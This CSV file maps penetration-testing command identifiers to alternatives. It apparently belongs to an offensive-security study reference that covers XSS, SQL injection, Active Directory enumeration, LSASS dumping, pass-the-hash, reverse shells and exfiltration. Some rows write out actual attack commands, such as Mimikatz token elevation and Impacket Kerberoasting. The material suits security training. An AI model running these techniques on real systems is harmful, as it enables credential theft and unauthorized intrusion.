"command_id","alternative_command_id"
"xss-filter-bypass-encoding","xss-filter-bypass-case"
"xss-filter-bypass-encoding","xss-filter-bypass-encoding"
"xss-cookie-stealer","xss-session-hijack-fetch"
"xss-session-hijack-fetch","xss-cookie-stealer"
"sqli-detection-error","sqlmap-post-exploitation"
"sqli-column-enum-orderby","sqlmap-post-exploitation"
"sqli-union-select-basic","sqlmap-post-exploitation"
"sqli-union-mysql-info","sqlmap-post-exploitation"
"sqli-union-postgresql-info","sqlmap-post-exploitation"
"sqli-union-mssql-info","sqlmap-post-exploitation"
"sqlmap-post-exploitation","sqli-detection-error"
"sqlmap-post-exploitation","sqli-column-enum-orderby"
"sqlmap-post-exploitation","sqli-union-select-basic"
"wpscan-enumerate-all","wordpress-manual-version"
"wpscan-enumerate-all","whatweb-enum"
"wpscan-enumerate-all","nikto-scan"
"wpscan-aggressive-detection","wordpress-manual-version"
"wpscan-password-attack","burp-intruder"
"wordpress-manual-version","whatweb-enum"
"wordpress-manual-version","wpscan-enumerate-all"
"curl-ua-poison-apache","lfi-access-log-apache"
"curl-ua-poison-apache","lfi-rce-trigger"
"wfuzz-params","burp-intruder"
"user-registration-test","burpsuite-modify-upload"
"burpsuite-modify-upload","create-php-webshell"
"sqlmap-from-request","sqli-manual-test"
"sqlmap-from-request-level3","sqlmap-from-request"
"sqlmap-enumerate-databases","sqli-union-mysql-info"
"sqlmap-enumerate-tables","sqli-union-mysql-info"
"sqlmap-dump-table","sqli-union-mysql-info"
"curl-wordpress-version-feed","wpscan-enumerate-all"
"powerview-get-netdomain","ps-get-current-domain"
"powerview-get-netdomaincontroller","ps-get-pdc"
"powerview-get-netuser","net-user-domain-list"
"powerview-get-netuser","ps-directorysearcher-users"
"powerview-get-netuser-filter","net-user-domain-detail"
"powerview-get-netuser-spn","setspn-query-all"
"powerview-get-netgroup","net-group-domain-list"
"powerview-get-netgroup","ps-directorysearcher-groups"
"powerview-get-netgroup-specific","net-group-domain-members"
"powerview-get-netgroupmember","powerview-get-netgroup-specific"
"powerview-get-netgroupmember","net-group-domain-members"
"powerview-get-netcomputer","ps-directorysearcher-computers"
"powerview-get-netcomputer","dsquery-computer"
"ps-get-current-domain","get-netdomain"
"ps-get-pdc","net-domain-controllers"
"ps-directorysearcher-users","get-netuser"
"ps-directorysearcher-groups","get-netgroup"
"ps-directorysearcher-computers","get-netcomputer"
"ps-directorysearcher-computers","dsquery-computer"
"ps-ldapsearch-users","get-netuser"
"ps-ldapsearch-computers","get-netcomputer"
"ps-ldapsearch-groups","get-netgroup"
"ps-ldapsearch-spns","get-netuser"
"powerview-get-netsession","psloggedon"
"powerview-get-netloggedon","psloggedon"
"sysinternals-psloggedon","powerview-get-netloggedon"
"net-view-shares","powerview-find-domainshare"
"gpp-password-files","get-gpppassword"
"net-user-domain-list","get-netuser"
"net-group-domain-list","get-netgroup"
"setspn-query-all","get-netuser"
"dsquery-user","net-user-domain-list"
"dsquery-user","get-netuser"
"dsquery-computer","get-netcomputer"
"dsquery-group","net-group-domain-list"
"dsquery-group","get-netgroup"
"net-group-domain-computers","get-netcomputer"
"net-domain-controllers","net-domain-controllers"
"setspn-list-all","get-netuser"
"dsquery-users","get-netuser"
"dsquery-computers","get-netcomputer"
"dsquery-domain-controllers","net-domain-controllers"
"powerview-get-objectacl","get-acl"
"powerview-get-netcomputer-os","get-adcomputer"
"powerview-get-netcomputer-os","crackmapexec-smb-spray"
"query-hkey-users-remote","psloggedon"
"ad-sid-whoami-extract","ad-sid-powerview-domain"
"ad-sid-whoami-extract","ad-sid-wmic-extract"
"ad-sid-powerview-domain","ad-sid-whoami-extract"
"ad-sid-powerview-domain","ad-sid-wmic-extract"
"ad-sid-wmic-extract","ad-sid-whoami-extract"
"ad-sid-wmic-extract","ad-sid-powerview-domain"
"ps-get-group-members-basic","powerview-get-netgroupmember"
"ps-nested-group-check-member-type","powerview-get-netgroupmember"
"ps-nested-group-recursive-function","powerview-get-netgroupmember"
"ps-get-last-nested-user","powerview-get-netuser"
"ps-find-new-domain-admin","powerview-get-netgroupmember"
"powerview-get-domaingroup-recursive","ps-nested-group-recursive-function"
"ps-powerview-get-user-details","ps-get-last-nested-user"
"ps-extract-flag-from-user","ps-get-last-nested-user"
"ps-nested-group-one-liner","powerview-get-domaingroup-recursive"
"nessus-scan","nmap-vuln-scan"
"nessus-scan","nikto-scan"
"nessus-scan","whatweb-enum"
"burp-intruder","wfuzz-params"
"burp-intruder","ffuf-param-fuzz"
"burp-intruder","wfuzz-dir"
"burp-scanner","nikto-scan"
"burp-scanner","sqlmap-basic"
"burp-scanner","wfuzz-params"
"wfuzz-z-file","ffuf-dir-fuzz"
"wfuzz-z-file","gobuster-dir"
"wfuzz-z-file","wfuzz-params"
"wfuzz-post-login-brute","hydra-http-post-form"
"wfuzz-post-login-brute","ffuf-param-fuzz"
"wfuzz-post-login-brute","burp-intruder"
"dirbuster","gobuster-dir"
"dirbuster","ffuf-dir-fuzz"
"masscan-full-tcp","nmap-port-check"
"masscan-full-tcp","nmap-service-scan"
"gpp-decrypt-python-script","get-gpppassword"
"manual-hash-generation-loop","john-show-cracked"
"python-http-server","python-m-simplehttpserver"
"rdesktop-disk-share","smb-server"
"rdesktop-disk-share","scp-transfer"
"ftp-transfer","python-m-simplehttpserver"
"invoke-watson","win-privesc-winpeas"
"find-suid-usr-bin","find-suid-binaries"
"gtfobins-capability-lookup","searchsploit-linux-capability"
"powershell-wget-alias","certutil-download"
"windows-hashcat-crack-ntlm","windows-hashcat-crack-ntlm-file"
"windows-hashcat-crack-ntlm","john-crack-ntlm"
"windows-hashcat-crack-ntlm-file","windows-hashcat-crack-ntlm"
"windows-hashcat-crack-ntlm-file","john-crack-ntlm-rules"
"windows-rdp-xfreerdp","ad-pass-the-hash-impacket-psexec"
"windows-rdp-xfreerdp","evil-winrm-shell"
"linux-kernel-exploit","cat-proc-version"
"linux-nfs-root-squash","showmount-e-localhost"
"linux-systemctl-privesc","getcap-bin-systemctl"
"linux-unix-privesc-check-nc","linux-linpeas-http"
"linux-unix-privesc-check-nc","linux-linpeas-nc"
"linux-unix-privesc-check-nc","linux-suid-find"
"linux-find-world-writable","linux-find-writable-etc-focused"
"linux-find-world-writable","linux-writable-passwd"
"linux-find-world-writable","linux-unix-privesc-check-nc"
"linux-find-writable-etc-focused","linux-find-world-writable"
"linux-find-writable-etc-focused","linux-writable-passwd"
"linux-find-writable-etc-focused","linux-test-file-writable"
"linux-linpeas-http","linux-linpeas-nc"
"linux-linpeas-http","linux-linpeas"
"linux-linpeas-http","linux-unix-privesc-check-nc"
"linux-linpeas-nc","linux-linpeas-http"
"linux-linpeas-nc","linux-linpeas"
"linux-linpeas-nc","linux-unix-privesc-check-nc"
"linux-linpeas-save-output","linux-linpeas-http"
"linux-linpeas-save-output","linux-linpeas"
"linux-linpeas-save-output","linux-parse-linpeas-writable"
"linux-test-file-writable","linux-writable-passwd"
"linux-test-file-writable","linux-find-world-writable"
"linux-test-file-writable","linux-find-writable-etc-focused"
"linux-check-shadow-readable","linux-find-world-writable"
"linux-check-shadow-readable","linux-test-file-writable"
"linux-parse-linpeas-writable","linux-find-world-writable"
"linux-parse-linpeas-writable","linux-find-writable-etc-focused"
"linux-parse-linpeas-writable","linux-linpeas-save-output"
"linux-find-writable-services-systemd","linux-writable-services"
"linux-find-writable-services-systemd","linux-systemctl-privesc"
"invoke-mimikatz-remote","procdump-lsass"
"invoke-mimikatz-remote","comsvcs-lsass-dump"
"procdump-lsass","invoke-mimikatz-remote"
"procdump-lsass","comsvcs-lsass-dump"
"pypykatz-parse","secretsdump-hashes"
"comsvcs-lsass-dump","procdump-lsass"
"comsvcs-lsass-dump","invoke-mimikatz-remote"
"ps-get-process-owner","win-tasklist-verbose"
"file-transfer-certutil","bitsadmin-download"
"exfil-uploadserver","file-transfer-python-http"
"exfil-uploadserver","exfil-smb-upload"
"exfil-powershell-upload","exfil-smb-upload"
"exfil-powershell-upload","exfil-nc-tcp-upload"
"exfil-powershell-upload","exfil-powershell-base64"
"exfil-smb-upload","exfil-powershell-upload"
"exfil-smb-upload","exfil-nc-tcp-upload"
"exfil-nc-tcp-upload","file-transfer-nc-pull"
"exfil-nc-tcp-upload","exfil-powershell-upload"
"exfil-powershell-base64","file-transfer-base64"
"exfil-powershell-base64","exfil-powershell-upload"
"exfil-curl-upload","file-transfer-nc-pull"
"exfil-curl-upload","file-transfer-scp"
"win-unquoted-service-paths","get-unquotedservice"
"win-weak-service-perms","get-modifiableservicefile"
"windows-whoami-privs","whoami-all"
"windows-systeminfo","get-computerinfo"
"windows-service-permissions","sc-sdshow-service"
"windows-kerberoasting","rubeus-kerberoast"
"get-aduser","powerview-get-netuser"
"get-aduser","net-user-domain-list"
"get-aduser","ps-ldapsearch-users"
"get-adgroup","powerview-get-netgroup"
"get-adgroup","net-group-domain-list"
"get-adgroup","ps-ldapsearch-groups"
"get-adgroupmember","powerview-get-netgroupmember"
"get-adgroupmember","net-group-domain-list"
"get-adcomputer","powerview-get-netcomputer"
"get-adcomputer","ps-ldapsearch-computers"
"get-ciminstance","get-wmiobject"
"get-computerinfo","win-systeminfo"
"get-computerinfo","get-ciminstance"
"get-unquotedservice","win-sc-query-services"
"import-module-activedirectory","import-powerview"
"import-module-activedirectory","ldapsearch-ad"
"import-powersploit","import-powerview"
"import-powersploit","import-powerup"
"powershell-runas-basic","fodhelper-uac-bypass"
"powershell-runas-basic","eventvwr-uac-bypass"
"powershell-runas-output-redirect","fodhelper-uac-bypass"
"powershell-runas-output-redirect","eventvwr-uac-bypass"
"powershell-runas-output-redirect","powershell-runas-keepopen"
"powershell-runas-keepopen","fodhelper-uac-bypass"
"powershell-runas-keepopen","eventvwr-uac-bypass"
"powershell-runas-download-execute","fodhelper-uac-bypass"
"powershell-runas-download-execute","eventvwr-uac-bypass"
"powershell-runas-download-execute","win-privesc-powerup"
"windows-net-use-smb-connect","pushd \\\\<TARGET>\\<SHARE> (temporary mapping, auto-disconnects)"
"windows-net-use-smb-connect","New-PSDrive -Name Z -PSProvider FileSystem -Root \\\\<TARGET>\\<SHARE> -Credential $cred (PowerShell)"
"kerberos-klist-purge","mimikatz.exe ""kerberos::purge"" ""exit"" (Mimikatz alternative)"
"kerberos-klist-purge","Rubeus.exe purge (Rubeus alternative)"
"windows-psexec-system-shell","mimikatz.exe ""privilege::debug"" ""token::elevate"" ""exit"" (Mimikatz token elevation)"
"windows-psexec-system-shell","Start-Process cmd.exe -Verb RunAs (PowerShell elevation, requires GUI)"
"powerview-enumerate-spns","Get-ADUser -Filter {ServicePrincipalName -ne '$null'} (ActiveDirectory module)"
"powerview-enumerate-spns","setspn -T <DOMAIN> -Q */* (Windows built-in)"
"powerview-enumerate-spns","GetUserSPNs.py <DOMAIN>/<USER>:<PASS> (Impacket from Kali)"
"ad-dcsync-check-privileges","(Get-Acl 'AD:\DC=corp,DC=com').Access | Where-Object {$_.ObjectType -like '*Replication*'} (ActiveDirectory module)"
"ad-dcsync-check-privileges","adfind.exe -b 'DC=corp,DC=com' -s base nTSecurityDescriptor (ADFind tool)"
"execute-sudo-exploit","sudo-exploit-find"
"execute-sudo-exploit","sudo-exploit-vim"
"execute-sudo-exploit","sudo-exploit-python"
"execute-sudo-exploit","sudo-exploit-less"
"execute-sudo-exploit","sudo-exploit-nmap"
"docker-privileged-escape","docker-mount-escape"
"docker-socket-mount","docker-mount-escape"
"find-suid-binaries","linux-suid-find"
"execute-suid-exploit-find","execute-suid-exploit-find"
"execute-suid-exploit-find","execute-suid-exploit-find"
"execute-suid-exploit-find","execute-sudo-exploit"
"verify-root-access-suid","cat-etc-shadow"
"winrm-enter-pssession","winrm-new-pssession"
"winrm-enter-pssession","winrm-invoke-command"
"winrm-enter-pssession","evil-winrm-creds"
"winrm-new-pssession","winrm-enter-pssession"
"winrm-new-pssession","winrm-invoke-command"
"winrm-invoke-command","winrm-new-pssession"
"winrm-invoke-command","evil-winrm-creds"
"winrm-invoke-command","wmi-invoke-method"
"winrm-winrs","winrm-invoke-command"
"winrm-winrs","evil-winrm-creds"
"evil-winrm-creds","evil-winrm-hash"
"evil-winrm-creds","winrm-enter-pssession"
"evil-winrm-creds","psexec-impacket-shell"
"evil-winrm-hash","evil-winrm-creds"
"evil-winrm-hash","psexec-impacket-shell"
"winrm-revshell-invoke","wmi-powershell-revshell"
"psexec-impacket-shell","psexec-sysinternals"
"psexec-impacket-shell","smbexec-impacket-fileless"
"psexec-impacket-shell","wmi-impacket-exec"
"psexec-impacket-shell","evil-winrm-creds"
"psexec-sysinternals","psexec-impacket-shell"
"psexec-sysinternals","psexec-sysinternals-interactive"
"psexec-sysinternals-interactive","psexec-sysinternals"
"smbexec-impacket-fileless","psexec-impacket-shell"
"smbexec-impacket-fileless","wmi-impacket-exec"
"smbexec-impacket-fileless","evil-winrm-creds"
"nc-listener-setup","socat-listener"
"bash-reverse-shell","python-reverse-shell"
"bash-reverse-shell","netcat-reverse-shell-mkfifo"
"msfvenom-windows-reverse-tcp","msfvenom-windows-meterpreter"
"msfvenom-linux-reverse-tcp","bash-reverse-shell"
"msfvenom-linux-reverse-tcp","python-reverse-shell"
"msfvenom-php-webshell","php-reverse-shell"
"netcat-reverse-shell-mkfifo","bash-reverse-shell"
"netcat-reverse-shell-mkfifo","python-reverse-shell"
"python-reverse-shell","bash-reverse-shell"
"python-reverse-shell","perl-reverse-shell"
"perl-reverse-shell","bash-reverse-shell"
"perl-reverse-shell","python-reverse-shell"
"php-reverse-shell","msfvenom-php-webshell"
"overpass-mimikatz-pth","overpass-rubeus-asktgt"
"passticket-mimikatz-inject","passticket-rubeus-ptt"
"passticket-mimikatz-inject","rubeus-ptt"
"passticket-rubeus-ptt","passticket-mimikatz-inject"
"overpass-rubeus-asktgt","overpass-mimikatz-pth"
"pth-mimikatz-sekurlsa","pth-impacket-psexec"
"pth-mimikatz-sekurlsa","pth-evil-winrm"
"pth-mimikatz-sekurlsa","pth-cme-spray"
"pth-impacket-psexec","pth-impacket-wmiexec"
"pth-impacket-psexec","pth-impacket-smbexec"
"pth-impacket-psexec","pth-evil-winrm"
"pth-impacket-wmiexec","pth-impacket-psexec"
"pth-impacket-wmiexec","pth-impacket-smbexec"
"pth-impacket-smbexec","pth-impacket-psexec"
"pth-impacket-smbexec","pth-impacket-wmiexec"
"pth-evil-winrm","pth-impacket-psexec"
"pth-evil-winrm","pth-impacket-wmiexec"
"pth-cme-spray","pth-impacket-psexec"
"pth-cme-exec","pth-impacket-psexec"
"impacket-psexec","impacket-smbexec"
"impacket-psexec","impacket-wmiexec"
"impacket-psexec","ad-pass-the-hash-impacket-psexec"
"impacket-smbexec","impacket-psexec"
"impacket-smbexec","impacket-wmiexec"
"impacket-wmiexec","impacket-psexec"
"impacket-wmiexec","impacket-smbexec"
"impacket-wmiexec","ad-pass-the-hash-impacket-wmiexec"
"impacket-secretsdump","ad-dcsync-secretsdump-user"
"impacket-secretsdump","ad-dcsync-secretsdump-all"
"impacket-secretsdump","crackmapexec-sam-dump"
"msf-set-option","msf-setg-option"
"msf-setg-option","msf-set-option"
"msf-db-import","msf-db-nmap"
"mysql-connect-basic","sqli-union-mysql-info"
"postgres-connect-basic","postgres-direct-connect"
"postgres-connect-basic","sqli-union-postgresql-info"
"msfvenom-linux-elf","msfvenom-linux-reverse-tcp"
"msfvenom-windows-exe","msfvenom-linux-reverse-tcp"
"searchsploit-cve-lookup","searchsploit"
"searchsploit-cve-lookup","searchsploit-service-version"
"searchsploit-service-version","searchsploit"
"searchsploit-service-version","searchsploit-cve-lookup"
"searchsploit-copy-exploit","searchsploit"
"searchsploit-copy-exploit","searchsploit-cve-lookup"
"searchsploit-copy-exploit","searchsploit-service-version"
"nmap-script-help","nmap-script-args"
"nmap-script-help","nmap-vuln-scan"
"nmap-script-args","nmap-script-help"
"nmap-script-args","nmap-vuln-scan"
"gobuster-dir-common","gobuster-dir-custom"
"gobuster-dir-common","gobuster-dir"
"gobuster-dir-custom","gobuster-dir-common"
"gobuster-dir-custom","gobuster-dir"
"nikto-comprehensive","nikto-scan"
"nikto-comprehensive","gobuster-dir-common"
"nikto-comprehensive","whatweb-technology-detection"
"dcom-mmc20-revshell","psexec-impacket-shell"
"dcom-shellbrowserwindow","dcom-shellwindows"
"msf-session-command","msf-session-interact"
"wmi-legacy-wmic","wmi-invoke-method"
"wmi-legacy-wmic","wmi-new-cimsession"
"wmi-legacy-wmic","wmi-impacket-exec"
"wmi-invoke-method","wmi-new-cimsession"
"wmi-invoke-method","wmi-impacket-exec"
"wmi-invoke-method","wmi-legacy-wmic"
"wmi-new-cimsession","wmi-invoke-method"
"wmi-new-cimsession","wmi-impacket-exec"
"wmi-impacket-exec","psexec-impacket-shell"
"wmi-impacket-exec","smbexec-impacket-fileless"
"wmi-impacket-exec","evil-winrm-shell"
"wmi-cme-exec","wmi-impacket-exec"
"mysql-connect-interactive","mysql-connect-basic"
"smbmap-enumerate-auth","smbmap-shares"
"smbmap-enumerate-auth","smbclient-connect"
"grep-metasploit-exploits","searchsploit-service-version"
"msfvenom-linux-x86-shell","msfvenom-linux-elf"
"msfvenom-linux-x64-meterpreter","msfvenom-linux-elf"
"msfvenom-windows-shell-tcp","msfvenom-windows-exe"
"msfvenom-windows-meterpreter-tcp","msfvenom-windows-exe"
"google-exploitdb-search","searchsploit-service-version"
"google-exploitdb-search","searchsploit-cve-lookup"
"whatweb-technology-id","curl-web-server-verify"
"nc-listener-non-staged","rlwrap-nc-listener"
"nc-listener-non-staged","msf-handler-setup"
"rlwrap-nc-listener","nc-listener-non-staged"
"ls-metasploit-auxiliary","msfconsole-search"
"msfvenom-windows-x64-meterpreter-tcp","msfvenom-windows-meterpreter-tcp"
"msfvenom-linux-x64-meterpreter-non-staged","msfvenom-linux-x64-meterpreter"
"msf-show-auxiliary","msf-search-auxiliary"
"meterpreter-getsystem","windows-exploit-suggester"
"msfvenom-php-reverse","php-reverse-shell"
"msfvenom-python-reverse","python-reverse-shell"
"msfvenom-bash-reverse","bash-reverse-shell"
